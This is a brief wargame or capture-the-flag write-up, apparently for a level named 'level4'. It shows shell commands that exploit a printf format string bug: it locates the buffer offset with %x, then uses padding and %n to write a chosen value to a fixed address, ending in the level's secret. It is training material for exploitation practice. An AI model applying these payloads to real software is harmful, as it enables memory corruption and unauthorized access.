We can write in a buffer that will be printed with `printf`, and we know about format string exploit. \
Here are the first few steps to exploit a format string outside of gdb:
```shell
$ # find where our buffer is written in memory:
$ python -c 'print "AAAA " + "%x " * 15' | ./level4
AAAAb7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520
$ # so we see here our A's written at location 12.

$ # we know we need to write '16930116' at address '0x8049810', and we can use printf's padding and the `%n` modifier to write how many bytes we want to this address:
$ python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' | ./level4
                    |_ write 4b (addr)   |_ write 16930112 bytes
...
...
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

